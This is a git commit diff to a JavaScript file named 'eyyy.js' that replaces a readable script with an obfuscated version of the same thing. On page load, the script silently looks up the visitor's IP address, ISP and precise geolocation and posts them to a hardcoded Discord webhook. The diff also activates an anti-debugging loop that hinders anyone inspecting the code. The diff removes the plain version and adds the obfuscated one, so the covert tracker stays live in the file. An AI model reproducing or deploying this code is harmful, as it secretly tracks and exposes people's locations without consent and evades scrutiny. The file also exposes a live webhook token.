704176d125327f999d8bf9bce67d65ce8f77d5a5
CreepKing8288 <93425203+CreepKing8288@users.noreply.github.com>
2025-08-20 18:48:33 +0800

    Update eyyy.js

--- eyyy.js
+++ eyyy.js
@@ -1,65 +1,21 @@
-// (function () {
-//         (function a() {
-//             try {
-//                 (function b(i) {
-//                     if (('' + (i / i)).length !== 1 || i % 20 === 0) {
-//                         (function () { }).constructor('debugger')()
-//                     } else {
-//                         debugger
-//                     }
-//                     b(++i)
-//                 }
-//                 )(0)
-//             } catch (e) {
-//                 setTimeout(a, 5000)
-//             }
-//         }
-//         )()
-//     }
-//     )();
+(function () {
+        (function a() {
+            try {
+                (function b(i) {
+                    if (('' + (i / i)).length !== 1 || i % 20 === 0) {
+                        (function () { }).constructor('debugger')()
+                    } else {
+                        debugger
+                    }
+                    b(++i)
+                }
+                )(0)
+            } catch (e) {
+                setTimeout(a, 5000)
+            }
+        }
+        )()
+    }
+    )();
 
-
-function fetchIpInfoAndSendMessage() {
-  const ipApiUrl = 'http://ip-api.com/json/?fields=as,city,country,countryCode,isp,lat,lon,org,query,region,regionName,status,timezone,zip';
-
-  fetch(ipApiUrl)
-    .then(res => res.json())
-    .then(ipInfo => sendMessage(ipInfo))
-}
-
-function sendMessage(ipInfo) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1407608063325638698/k7bNW0bOjuJXNLLCJaq32p4mJ3oU9NYHR0vZhium9-CFf3hEj4-xaT8tnEjMEMKMc_Ss';
-
-  // Compose the message with all requested fields
-  const content = `
---Contact--
-
-New Message Submission:
-
-AS: ${ipInfo.as}
-City: ${ipInfo.city}
-Country: ${ipInfo.country}
-Country Code: ${ipInfo.countryCode}
-ISP: ${ipInfo.isp}
-Latitude: ${ipInfo.lat}
-Longitude: ${ipInfo.lon}
-Org: ${ipInfo.org}
-Query (IP): ${ipInfo.query}
-Region: ${ipInfo.region}
-Region Name: ${ipInfo.regionName}
-Status: ${ipInfo.status}
-Timezone: ${ipInfo.timezone}
-Zip: ${ipInfo.zip}
-`.trim();
-
-  fetch(webhookUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({ content }),
-  })
-}
-
-// Example usage:
-fetchIpInfoAndSendMessage();
+function _0x31a0(_0x59b2a2,_0x11a670){const _0x31e703=_0x31e7();return _0x31a0=function(_0x31a09e,_0x3ee18f){_0x31a09e=_0x31a09e-0x11e;let _0x366fb7=_0x31e703[_0x31a09e];return _0x366fb7;},_0x31a0(_0x59b2a2,_0x11a670);}(function(_0x3488dd,_0x9f685d){const _0x45cd13=_0x31a0,_0x35a716=_0x3488dd();while(!![]){try{const _0x118503=-parseInt(_0x45cd13(0x133))/0x1*(-parseInt(_0x45cd13(0x143))/0x2)+-parseInt(_0x45cd13(0x122))/0x3*(-parseInt(_0x45cd13(0x13f))/0x4)+parseInt(_0x45cd13(0x13b))/0x5*(parseInt(_0x45cd13(0x121))/0x6)+parseInt(_0x45cd13(0x140))/0x7+-parseInt(_0x45cd13(0x12c))/0x8+parseInt(_0x45cd13(0x11e))/0x9+-parseInt(_0x45cd13(0x132))/0xa;if(_0x118503===_0x9f685d)break;else _0x35a716['push'](_0x35a716['shift']());}catch(_0x33e185){_0x35a716['push'](_0x35a716['shift']());}}}(_0x31e7,0x1a31f));function fetchIpInfoAndSendMessage(){const _0x2233c4=_0x31a0,_0x4ec754=_0x2233c4(0x139);fetch(_0x4ec754)[_0x2233c4(0x137)](_0x32b398=>_0x32b398[_0x2233c4(0x123)]())['then'](_0x398b85=>sendMessage(_0x398b85));}function _0x31e7(){const _0x3b2a30=['longitude','POST','latitude','then','region','https://ipapi.co/json/','\x0aCity:\x20','245785TJgqmh','postal','\x0aASN\x20/\x20Org:\x20','trim','1888xknaxv','285278yPsLSa','\x0aIP:\x20','\x0aPostal\x20Code:\x20','10RkCEwt','233442bfYvPC','\x0a\x0aTimezone:\x20','country_name','18uewfZa','384zTsSZI','json','org','\x0a\x0aRegion:\x20','\x0aLongitude:\x20','version','\x0aCountry\x20Code:\x20','region_code','timezone','\x0a--Connection--\x0a\x0aNew\x20Message\x20Submission:\x0a\x0aType:\x20','1441576OftZdl','country','application/json','\x0aRegion\x20Code:\x20','\x0aCountry:\x20','city','931520DAFWNl','21213jvojzl'];_0x31e7=function(){return _0x3b2a30;};return _0x31e7();}function sendMessage(_0x182619){const _0x811506=_0x31a0,_0xf59cf1='https://discord.com/api/webhooks/1407608063325638698/k7bNW0bOjuJXNLLCJaq32p4mJ3oU9NYHR0vZhium9-CFf3hEj4-xaT8tnEjMEMKMc_Ss',_0x461026=(_0x811506(0x12b)+_0x182619[_0x811506(0x127)]+_0x811506(0x13a)+_0x182619[_0x811506(0x131)]+_0x811506(0x130)+_0x182619[_0x811506(0x120)]+_0x811506(0x128)+_0x182619[_0x811506(0x12d)]+_0x811506(0x13d)+_0x182619[_0x811506(0x124)]+_0x811506(0x141)+_0x182619['ip']+_0x811506(0x125)+_0x182619[_0x811506(0x138)]+_0x811506(0x12f)+_0x182619[_0x811506(0x129)]+_0x811506(0x142)+_0x182619[_0x811506(0x13c)]+_0x811506(0x11f)+_0x182619[_0x811506(0x12a)]+'\x0aLatitude:\x20'+_0x182619[_0x811506(0x136)]+_0x811506(0x126)+_0x182619[_0x811506(0x134)]+'\x0a')[_0x811506(0x13e)]();fetch(_0xf59cf1,{'method':_0x811506(0x135),'headers':{'Content-Type':_0x811506(0x12e)},'body':JSON['stringify']({'content':_0x461026})});}fetchIpInfoAndSendMessage();
